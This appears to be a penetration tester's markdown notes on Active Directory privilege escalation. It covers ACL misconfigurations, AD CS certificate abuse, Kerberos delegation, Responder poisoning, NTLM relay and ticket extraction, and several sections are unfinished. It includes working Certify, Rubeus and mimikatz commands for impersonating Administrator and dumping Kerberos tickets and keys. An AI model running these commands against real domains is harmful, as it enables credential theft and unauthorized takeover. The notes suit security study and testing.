---
title: Active Directory privilege-escalation
---

- [1. Permission Delegation](#1-permission-delegation)
  - [1.1. Bloodhound](#11-bloodhound)
- [2. AD Certificate Services](#2-ad-certificate-services)
- [3. Kerberos (Credential) Delegation](#3-kerberos-credential-delegation)
  - [3.1. Unconstrained Delegation](#31-unconstrained-delegation)
  - [3.2. Constrained Delegation](#32-constrained-delegation)
  - [3.3. Resource-Based Constrained Delegation](#33-resource-based-constrained-delegation)
- [4. Automated Relays](#4-automated-relays)
- [5. DNS poisoning attack](#5-dns-poisoning-attack)
- [6. NTLM relay attack](#6-ntlm-relay-attack)
- [7. Kerberoasting](#7-kerberoasting)
- [8. AS-REP Roasting](#8-as-rep-roasting)
- [9. Extracting Kerberos TGT](#9-extracting-kerberos-tgt)
- [10. Extracting Kerberos user's key](#10-extracting-kerberos-users-key)

## 1. Permission Delegation
AD can delegate permissions using a feature called _Permission Delegation_. For example: in an organization three users have access to AD credentials. It would be hard to manage all the tasks by only 3 people so they can delegate the permission e.g. to change a user's password to the Helpdesk team. Now the helpdesk team has permission to change passwords. In large organization there is a problem to keep track of all delegations and keep them secure. Misconfigurations are very common.

If you accidentally can add yourself for example to the _IT Support_ group and then you have permissions to change a password of any _Admins_, you can escalate your privileges.

### 1.1. Bloodhound
Some misconfigured ACEs associated with user groups can lead to interesting vulnerabilities. Bloodhound identifies potential mosconfigurations and explains how to exploit them:

- `ForceChangePassword` - reset the user's current password.
- `AddMembers` - add users, groups or machines to the target group.
- `GenericAll` - complete control over the object (add members and reset password included).
- `GenericWrite` - update any non-protected parameters of target object (update the `scriptPath` parameter included).
- `WriteOwner` - update owner of the target object (making ourselves the owner included).
- `WriteDACL` - write new ACEs to the target object's DACL (writing full access ACE included).
- `AllExtendedRights` - perform any action associated with extended AD rights against the target object (changing user's password included).

## 2. AD Certificate Services
Being within AD domain where the AD CS is installed, a domain user can request a X.509 certificate for different purposes (including AD authentication via PKINIT feature). AD CS has admin-defined **Certificate Templates** that specify available parameters and values of a requested certificate.

Most important values:

- CA Name - which server is the Certified Authority for the cert.
- Template Name - the name of the cert template.
- Enrollment Rights - who can request (which group of users) such a cert.
- PKI Extended Key Usage - what's the purpose of the cert.

`Certify` is a tool to enumerate and abuse misconfiguration in AD CS (vulnerable certificate templates).

```powershell
# Check possible vulnerabilities in AD certificates
Certify.exe find /vulnerable
```

If any user can enroll this certificate (e.g. _Domain Users_ group), its purpose is defined as _Client Authentication_ (a user can auth to AD using this cert) and ENROLLEE_SUPLIES_SUBJECT flag is set (subject of the cert is defined by enrollee)... **privilege escalation**! Any user can enroll the certificate for Administrator and use it to perform AD authentication.

```powershell
# Request an certificate for Administrator
Certify.exe request /ca:<ca-name> /template:<template-name> /altname:Administrator

# Request Kerberos TGT using the received certificate
Rubeus.exe asktgt /user:Administrator /certificate:<cert.pfx> /password:password /ptt

# Check if privilege escalation works (it might not work but look for NT hash)
dir \\<dc>\C$
```

Requesting TGT using the certificate (with `Rubeus`) should return user's NT hash that can be use to **pass-the-hash** (if PKINIT is enabled). It uses so-called user-to-user (u2u) auth - the user authenticates to itself using Kerberos and retrieves its NT hash.

**NOTE**: Certify.exe returns a `PEM` format certificate. It must be converted into the `PFX` format to use it with `Rubeus`:

```bash
openssl pkcs12 -in <cert.pem> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <cert.pfx>
```

> **RESOURCES**: [Awesome BlackHat explanation](https://www.youtube.com/watch?v=ejmAIgxFRgM), [corresponding blog post](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

Most `impacket` tools are able to work with TGT authentication.

## 3. Kerberos (Credential) Delegation

> **NOTE**: Most often in the AD context the _Kerberos Delegation_ is the one being duscussed, not _Permission Delegation_.

The practical use of Kerberos delegation is to enable an application to access resources hosted on a different server.

### 3.1. Unconstrained Delegation
_Unconstrained Delegation_ provides no limits to the delegation.

### 3.2. Constrained Delegation
_Constrained Delegation_ restricts what services an account can be delegated to, limiting exposure if an account is compromised. Exploiting Constrained Delegation is more complex than exploiting Unconstrained Delegation since the delegated account can't be used for everything.  

### 3.3. Resource-Based Constrained Delegation
TBD

## 4. Automated Relays
All Windows hosts have a _machine account_. Passwords of these accounts are uncrackable. They are used quite a bit in different services. It's common to see that one machine has admin rights over another machine.

TBD

## 5. DNS poisoning attack
`Responder` is used to poison the responses during NTLM authentication, tricking the victim into talking to the attacker instead of legit servers. Responder will attempt to poison any of the following requests:

- Link-Local Multicast Name Resolution (LLMNR)
- NetBIOS Name Server (NBT-NS)
- Web Proxy Auto-Discovery (WPAD)

These protocols are used to perform local DNS resolution for all hosts in the LAN. They relay on requests broadcasted on the LAN, so the attacker can receive these requests. Responder actively listens to the requests and sends poisoned responses lying that attacker is a searched hostname. Responder basically attempts to win the race for hostname resolution. Tricked server attempts to perform NTLM auth with the attacker.

## 6. NTLM relay attack
In some cases attacker can try to relay the challenge intead of capturing it directly. It's harder and not usually popular for initial foothold.

- SMB singing should be disabled or enabled but not enforced - attacker is going to make some changes in the request passed along.
- Associated account needs the permissions to access these resources - ideally attacker hopes for an admin account.
- A little bit of guessing which account has which permissions etc. It's more useful for lateral movement and privilege escalation.

## 7. Kerberoasting
TBD

## 8. AS-REP Roasting
If Kerberos doesn't require _pre-authentication_, it's possible to retrieve password hashes performing _AS-REP Roasting_ attack.

## 9. Extracting Kerberos TGT
Kerberos tickets can be extracted from LSASS memory (Kerberos harvesting) using `mimikatz` or `rubeus` tool. Most often it requires administrator privileges.

```powershell
# Show all Kerberos tickets stored in memory (and associated services)
Rubeus.exe triage

# Dump Kerberos tickets of :user
Rubeus.exe dump /user:<user>

# Dump Kerberos tickets of :service
Rubeus.exe dump /service:<service>
```

## 10. Extracting Kerberos user's key
It's being done to perform Pass-the-Key attack.

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::ekeys"
```
